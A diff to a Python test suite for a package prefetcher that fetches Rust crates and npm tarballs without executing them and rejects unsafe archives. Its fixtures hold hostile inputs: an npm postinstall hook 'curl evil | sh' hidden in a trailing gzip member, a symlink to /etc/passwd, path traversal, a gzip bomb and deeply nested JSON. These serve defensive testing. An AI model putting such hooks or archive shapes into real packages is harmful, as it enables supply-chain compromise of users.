@@ -10,14 +10,18 @@ time, and calls the module's `main` in-process on `tempfile.mkdtemp`
 directories.
 
 Cases: a fetched crate (build.rs, a build/ module, proc-macro) and a fetched
-scoped npm package (a postinstall naming a script, binding.gyp), with
-trimmed metadata and only the selected files; nothing executed (markers,
+scoped npm package (a postinstall naming a script), with trimmed metadata
+and only the selected files; nothing executed (markers,
 execute bits, an AST rule on prefetch.py); the allowed hosts only (the URL
 log, check_url, no proxy, no redirect, no Authorization header, blocked
 sockets, the response cap); other sources refused with no request; hash
 mismatches and missing hashes; unsafe archives (absolute, `..`, symlink,
-hard link, FIFO, oversized member, gzip bomb, member count, outside the top
-directory, oversized selected file); single-package failures; the CLI
+hard link, FIFO, gzip bomb, member count, outside the top directory,
+oversized selected file); proc-macro through `crate-type`; members equal
+only under case or Unicode folding; data after the gzip stream; build and
+install code that names files not copied (`partial`); errors of any kind
+and non-regular members as `failed`, never a crash; the member cap on
+selected files only and the npm version-document fallback; single-package failures; the CLI
 (stale output, no packages.json, malformed input, bad arguments); Python
 3.9 syntax and standard-library imports only.
 
@@ -47,7 +51,7 @@ HERE = Path(__file__).resolve().parent
 SCRIPT = HERE / "prefetch.py"
 STDLIB = frozenset(
     "argparse ast base64 contextlib hashlib importlib io json os re shutil socket subprocess sys tarfile tempfile"
-    " time urllib zlib pathlib".split()
+    " time unicodedata posixpath urllib zlib pathlib".split()
 )
 CRATES = "registry+https://github.com/rust-lang/crates.io-index"
 YQ_ARGV = ["yq", "-p=toml", "-o=json", "."]
@@ -127,7 +131,7 @@ class Fixture:
             b"[lib]\nproc-macro = true\n",
             "build.rs": f'fn main() {{ std::fs::write("{self.marker_build}", "ran").unwrap(); }}\n'.encode(),
             "build/helper.rs": b"pub fn help() {}\n",
-            "src/lib.rs": b"pub fn lib() {}\n",
+            "src/lib.rs": b"mod other;\npub fn lib() {}\n",
             "src/other.rs": b"pub fn other() {}\n",
             "README.md": b"SECRET-README\n",
             "nested/Cargo.toml": b'[package]\nname = "nested"\n',
@@ -140,8 +144,7 @@ class Fixture:
                     "scripts": {"postinstall": f"node scripts/post.js; touch {self.marker_install}"},
                 }
             ).encode(),
-            "scripts/post.js": b"console.log('post');\n",
-            "binding.gyp": b"{}\n",
+            "scripts/post.js": b"const fs = require('fs');\nconsole.log('post');\n",
             "index.js": b"module.exports = 1;\n",
             "README.md": b"SECRET-README\n",
         }
@@ -252,7 +255,7 @@ class Fake:
         if url not in self.routes:
             raise P.FetchError(f"{url}: HTTP 404")
         if len(self.routes[url]) > cap:
-            raise P.FetchError(f"{url}: response over {cap} bytes")
+            raise P.OverCap(f"{url}: response over {cap} bytes")
         return self.routes[url]
 
 
@@ -317,12 +320,12 @@ def fetched(box: Box, fx: Fixture):
     T.check("fetched: a package listed twice is fetched once", fake.log.count(archive_url) == 1, str(fake.log))
 
     metadata, copied = files_of(out, "cargo/goodcrate@1.2.3")
-    wanted = ["Cargo.toml", "build.rs", "build/helper.rs", "src/lib.rs"]
+    wanted = ["Cargo.toml", "build.rs", "build/helper.rs", "src/lib.rs", "src/other.rs"]
     T.check("crate: exactly the selected files", sorted(copied) == wanted, str(sorted(copied)))
     T.check("crate: the deeper Cargo.toml is not selected", "nested/Cargo.toml" not in copied)
     T.check("crate: copied bytes match", all(copied[p] == fx.crate_files[p] for p in copied))
     names = sorted(p.name for p in (out / "cargo/goodcrate@1.2.3/files").iterdir())
-    T.check("crate: numbered names", names == ["1.txt", "2.txt", "3.txt", "4.txt"], str(names))
+    T.check("crate: numbered names", names == ["1.txt", "2.txt", "3.txt", "4.txt", "5.txt"], str(names))
     T.check("crate: build_time", metadata["build_time"] == ["build.rs", "proc-macro"], str(metadata["build_time"]))
     registry = metadata["registry"]
     T.check(
@@ -343,10 +346,10 @@ def fetched(box: Box, fx: Fixture):
     metadata, copied = files_of(out, "npm/@scope/pkg@2.0.0")
     T.check(
         "npm: exactly the selected files",
-        sorted(copied) == ["binding.gyp", "package.json", "scripts/post.js"],
+        sorted(copied) == ["package.json", "scripts/post.js"],
         str(sorted(copied)),
     )
-    T.check("npm: build_time", metadata["build_time"] == ["postinstall", "binding.gyp"], str(metadata["build_time"]))
+    T.check("npm: build_time", metadata["build_time"] == ["postinstall"], str(metadata["build_time"]))
     registry = metadata["registry"]
     T.check(
         "npm: trimmed fields",
@@ -539,8 +542,7 @@ def archives(box: Box, fx: Fixture):
         "a .. member": (base + [(f"{top}/../escape", b"x")], {}, "component"),
         "a symlink": (base + [(f"{top}/link", "sym", "/etc/passwd")], {}, "a link"),
         "a hard link": (base + [(f"{top}/hard", "lnk", f"{top}/Cargo.toml")], {}, "a link"),
-        "a FIFO": (base + [(f"{top}/fifo", "fifo")], {}, "neither a file nor a directory"),
-        "an oversized member": (base + [(f"{top}/big", b"x" * 2000)], {"MEMBER_CAP": 1000}, "over 1000 bytes"),
+        "a FIFO": (base + [(f"{top}/fifo", "fifo")], {}, "not a regular file or a directory"),
         "a gzip bomb": (base + [(f"{top}/zeros", b"\0" * 200000)], {"TOTAL_CAP": 100000}, "decompressed"),
         "too many members": (base + [(f"{top}/f{i}", b"x") for i in range(10)], {"MEMBER_COUNT": 5}, "over 5 members"),
         "a member outside the top directory": (base + [("other/x", b"x")], {}, "outside"),
@@ -588,6 +590,222 @@ def failures(box: Box, fx: Fixture):
         len(reasons) == 2 and "404" in reasons[0] and "over" in reasons[1],
         str(reasons),
     )
+
+
+# --- review round 1 ---------------------------------------------------------
+
+
+def one_crate(box: Box, files: dict, caps: dict = None, raw: bytes = None, name: str = "rc") -> tuple:
+    """(prefetch.json record, metadata.json or None) for a crate rc 1.0.0 holding files (or the archive raw)."""
+    archive = raw if raw is not None else Fixture.crate_archive(name, "1.0.0", files)
+    holder = Fixture.__new__(Fixture)
+    holder.routes = {}
+    Fixture.add_crate(holder, name, "1.0.0", archive)
+    with lowered(**(caps or {})):
+        _, out, result, _ = box.run(
+            [entry("cargo", name, "1.0.0", digest=hashlib.sha256(archive).hexdigest())], holder.routes
+        )
+    return outcome(out, result)
+
+
+def one_npm(box: Box, files: dict = None, raw: bytes = None, caps: dict = None, routes: dict = None) -> tuple:
+    """(prefetch.json record, metadata.json or None) for an npm package rp 1.0.0 holding files (or the archive raw)."""
+    archive = raw if raw is not None else tgz([("package/" + k, v) for k, v in files.items()])
+    holder = Fixture.__new__(Fixture)
+    holder.routes = {}
+    Fixture.add_npm(holder, "rp", "1.0.0", archive)
+    holder.routes.update(routes or {})
+    with lowered(**(caps or {})):
+        _, out, result, _ = box.run([entry("npm", "rp", "1.0.0", digest=sha512(archive))], holder.routes)
+    return outcome(out, result)
+
+
+def outcome(out: Path, result) -> tuple:
+    record = result["packages"][0] if result else {}
+    metadata = None
+    if record.get("dir"):
+        metadata = json.loads((out / record["dir"] / "metadata.json").read_text(encoding="utf-8"))
+    return record, metadata
+
+
+def copied_paths(metadata) -> list:
+    return sorted(f["archive_path"] for f in metadata["files"]) if metadata else None
+
+
+CARGO = b'[package]\nname = "rc"\nversion = "1.0.0"\n'
+
+
+def proc_macro_forms(box: Box):
+    for label, lib in (
+        ("crate-type", b'[lib]\ncrate-type = ["proc-macro"]\n'),
+        ("crate_type", b'[lib]\ncrate_type = ["rlib", "proc-macro"]\n'),
+    ):
+        record, metadata = one_crate(box, {"Cargo.toml": CARGO + lib, "src/lib.rs": b"pub fn m() {}\n"})
+        found = metadata["build_time"] if metadata else record
+        T.check(f"F1 {label}: a proc-macro", found == ["proc-macro"], str(found))
+        T.check(f"F1 {label}: the lib root copied", copied_paths(metadata) == ["Cargo.toml", "src/lib.rs"])
+    for label, lib in (
+        ("a crate-type string", b'[lib]\ncrate-type = "proc-macro"\n'),
+        ("a non-boolean proc-macro", b'[lib]\nproc-macro = "yes"\n'),
+        ("a lib that is not a table", b'lib = "x"\n'),
+    ):
+        manifest = lib + CARGO if lib.startswith(b"lib") else CARGO + lib
+        record, metadata = one_crate(box, {"Cargo.toml": manifest, "src/lib.rs": b"pub fn m() {}\n"})
+        T.check(f"F1 {label}: undetermined", metadata and metadata["build_time"] == "undetermined", str(record))
+
+
+def case_folding(box: Box):
+    cases = {
+        "Build.rs with no build key": {"Cargo.toml": CARGO, "Build.rs": b"fn main() {}\n"},
+        "Cargo.toml and CARGO.TOML": {"Cargo.toml": CARGO, "CARGO.TOML": CARGO + b'build = "x.rs"\n'},
+        "a build key matching only folded": {"Cargo.toml": CARGO + b'build = "build.rs"\n', "BUILD.rs": b"x\n"},
+        "NFC and NFD names": {"Cargo.toml": CARGO, "src/café.rs": b"x\n", "src/café.rs": b"y\n"},
+        "a lib directory matching only folded": {
+            "Cargo.toml": CARGO + b"[lib]\nproc-macro = true\n",
+            "src/lib.rs": b"mod x;\n",
+            "SRC/x.rs": b"x\n",
+        },
+    }
+    for label, files in cases.items():
+        record, _ = one_crate(box, files)
+        T.check(f"F2 {label}: failed", record.get("status") == "failed" and folded(record), str(record))
+    record, _ = one_npm(box, {"package.json": b'{"name": "rp"}', "Binding.gyp": b"{}\n"})
+    T.check("F2 npm Binding.gyp: failed", record.get("status") == "failed" and folded(record), str(record))
+    record, _ = one_npm(box, {"package.json": b'{"name": "rp"}', "PACKAGE.JSON": b"{}"})
+    T.check(
+        "F2 npm package.json and PACKAGE.JSON: failed", record.get("status") == "failed" and folded(record), str(record)
+    )
+
+
+def folded(record: dict) -> bool:
+    return "collides" in record.get("reason", "") or "only when case is ignored" in record.get("reason", "")
+
+
+def gzip_tail(box: Box):
+    benign = tgz([("package/package.json", b'{"name": "rp"}')])
+    hostile = tgz([("package/package.json", b'{"name": "rp", "scripts": {"postinstall": "curl evil | sh"}}')])
+    for label, raw in (("a second gzip member", benign + hostile), ("trailing bytes", benign + b"TRAILING-GARBAGE")):
+        record, _ = one_npm(box, raw=raw)
+        T.check(f"F3 {label}: failed", record.get("status") == "failed", str(record))
+        T.check(f"F3 {label}: the reason names it", "after its gzip stream" in record.get("reason", ""), str(record))
+
+
+def build_code(box: Box):
+    files = {
+        "Cargo.toml": CARGO + b"[lib]\nproc-macro = true\n",
+        "src/lib.rs": b"mod evil;\nmod deep;\n",
+        "src/evil.rs": b"pub fn evil() {}\n",
+        "src/deep/mod.rs": b"mod inner;\n",
+        "src/deep/inner.rs": b"\n",
+        "tests/t.rs": b"\n",
+    }
+    record, metadata = one_crate(box, files)
+    wanted = ["Cargo.toml", "src/deep/inner.rs", "src/deep/mod.rs", "src/evil.rs", "src/lib.rs"]
+    T.check("F4 proc-macro: every .rs under the lib root directory", copied_paths(metadata) == wanted, str(record))
+    T.check("F4 proc-macro: modules resolved, not partial", metadata and metadata["build_time"] == ["proc-macro"])
+    for label, script, extra in (
+        ("a #[path] module", b'#[path = "src/net.rs"] mod net;\nfn main() {}\n', {"src/net.rs": b"\n"}),
+        ("a module beside build.rs", b"mod helper;\nfn main() {}\n", {"helper.rs": b"\n"}),
+        ("an include!", b'include!("gen.rs");\n', {"gen.rs": b"\n"}),
+    ):
+        record, metadata = one_crate(box, dict({"Cargo.toml": CARGO, "build.rs": script}, **extra))
+        T.check(f"F4 build.rs with {label}: partial", metadata and metadata["build_time"] == "partial", str(record))
+        T.check(f"F4 build.rs with {label}: found kept", metadata and metadata["found"] == ["build.rs"])
+    custom = CARGO + b'build = "build/main.rs"\n'
+    record, metadata = one_crate(box, {"Cargo.toml": custom, "build/main.rs": b"mod m;\n", "build/m.rs": b"\n"})
+    found = metadata["build_time"] if metadata else record
+    T.check("F4 a build/main.rs with a build/ module: not partial", found == ["build=build/main.rs"], str(found))
+    hook = b'{"name": "rp", "scripts": {"postinstall": "node scripts/post.js"}}'
+    for label, script, expected in (
+        ("a relative require of an uncopied file", b'require("./lib/helper");\n', "partial"),
+        ("a dynamic require", b"require(name);\n", "partial"),
+        ("a missing relative require", b'require("./gone");\n', "partial"),
+        ("a builtin require only", b'const fs = require("fs");\n', ["postinstall"]),
+    ):
+        files = {"package.json": hook, "scripts/post.js": script, "scripts/lib/helper.js": b"\n"}
+        record, metadata = one_npm(box, files)
+        build_time = metadata["build_time"] if metadata else record
+        T.check(f"F4 install script with {label}: {expected}", build_time == expected, str(build_time))
+    shell = b'{"name": "rp", "scripts": {"install": "sh setup.sh"}}'
+    record, metadata = one_npm(box, {"package.json": shell, "setup.sh": b"./other\n"})
+    T.check("F4 a shell install script: partial", metadata and metadata["build_time"] == "partial", str(record))
+    record, metadata = one_npm(box, {"package.json": b'{"name": "rp"}', "binding.gyp": b"{}\n"})
+    T.check("F4 binding.gyp: partial", metadata and metadata["build_time"] == "partial", str(record))
+
+
+def no_crash(box: Box):
+    deep = b'{"name": "rp", "x": ' + b"[" * 200000 + b"]" * 200000 + b"}"
+    record, metadata = one_npm(box, {"package.json": deep})
+    T.check("F5 a deeply nested package.json: no crash", record.get("status") in ("fetched", "failed"), str(record))
+    T.check(
+        "F5 a deeply nested package.json: not judged sound",
+        record.get("status") == "failed" or (metadata or {}).get("build_time") == "undetermined",
+    )
+    holder = Fixture.__new__(Fixture)
+    holder.routes = {P.NPM_TARBALLS + "rp": b"[" * 200000 + b"]" * 200000}
+    _, _, result, _ = box.run([entry("npm", "rp", "1.0.0", digest=sha512(b"x"))], holder.routes)
+    T.check("F5 a deeply nested packument: failed", statuses(result) == [("rp", "failed")], str(result))
+    for label, kind in (("a contiguous member", tarfile.CONTTYPE), ("a GNU sparse member", tarfile.GNUTYPE_SPARSE)):
+        buffer = io.BytesIO()
+        with tarfile.open(fileobj=buffer, mode="w:gz", format=tarfile.GNU_FORMAT) as tar:
+            info = tarfile.TarInfo("rc-1.0.0/Cargo.toml")
+            info.size, info.type = len(CARGO), kind
+            tar.addfile(info, io.BytesIO(CARGO))
+        record, _ = one_crate(box, {}, raw=buffer.getvalue())
+        T.check(f"F5 {label}: failed", record.get("status") == "failed", str(record))
+    saved = P.crate_selection
+    P.crate_selection = lambda archive: {}["boom"]
+    try:
+        record, _ = one_crate(box, {"Cargo.toml": CARGO})
+    finally:
+        P.crate_selection = saved
+    T.check("F5 an unexpected error: failed, not a crash", record.get("status") == "failed", str(record))
+    T.check("F5 an unexpected error: the reason names it", "KeyError" in record.get("reason", ""), str(record))
+
+
+def caps(box: Box):
+    record, metadata = one_crate(box, {"Cargo.toml": CARGO, "big.bin": b"x" * 2000}, {"MEMBER_CAP": 1000})
+    T.check("F7 an oversized unselected member: fetched", record.get("status") == "fetched", str(record))
+    record, _ = one_crate(box, {"Cargo.toml": CARGO, "build.rs": b"x" * 2000}, {"MEMBER_CAP": 1000})
+    T.check("F7 an oversized selected member: failed", record.get("status") == "failed", str(record))
+    T.check("F7 an oversized selected member: the reason", "over 1000 bytes" in record.get("reason", ""), str(record))
+    record, _ = one_crate(
+        box, {"Cargo.toml": CARGO, "build.rs": b"x" * 600, "build/a.rs": b"x" * 600}, {"COPY_TOTAL": 1000}
+    )
+    T.check("F4 copied files over COPY_TOTAL together: failed", record.get("status") == "failed", str(record))
+    archive = tgz([("package/package.json", b'{"name": "rp"}')])
+    version_doc = {
+        "name": "rp",
+        "version": "1.0.0",
+        "dist": {"tarball": "https://registry.npmjs.org/rp/-/rp-1.0.0.tgz", "integrity": sha512(archive)},
+        "_npmUser": {"name": "bob", "email": "bob@example.invalid"},
+        "maintainers": [{"name": "bob", "email": "bob@example.invalid"}],
+        "license": "MIT",
+    }
+    routes = {P.NPM_TARBALLS + "rp/1.0.0": json.dumps(version_doc).encode()}
+    record, metadata = one_npm(
+        box, raw=archive, caps={"NPM_META_CAP": 1000}, routes=dict(routes, **{P.NPM_TARBALLS + "rp": b" " * 2000})
+    )
+    T.check(
+        "F7 a packument over its cap: fetched from the version document", record.get("status") == "fetched", str(record)
+    )
+    registry = (metadata or {}).get("registry", {})
+    T.check(
+        "F7 version document: publisher kept, history null",
+        registry.get("source") == "version document"
+        and registry.get("publisher") == "bob"
+        and registry.get("history") is None
+        and registry.get("maintainers") == ["bob"],
+        str(registry),
+    )
+    wrong = dict(version_doc, version="9.9.9")
+    record, _ = one_npm(
+        box,
+        raw=archive,
+        caps={"NPM_META_CAP": 1000},
+        routes={P.NPM_TARBALLS + "rp": b" " * 2000, P.NPM_TARBALLS + "rp/1.0.0": json.dumps(wrong).encode()},
+    )
+    T.check("F7 a version document for another version: failed", record.get("status") == "failed", str(record))
 
 
 def cli(box: Box):
@@ -649,6 +867,8 @@ def main() -> int:
         integrity(box, fx)
         archives(box, fx)
         failures(box, fx)
+        for case in (proc_macro_forms, case_folding, gzip_tail, build_code, no_crash, caps):
+            case(box)
         hosts()
         cli(box)
         source_rules()
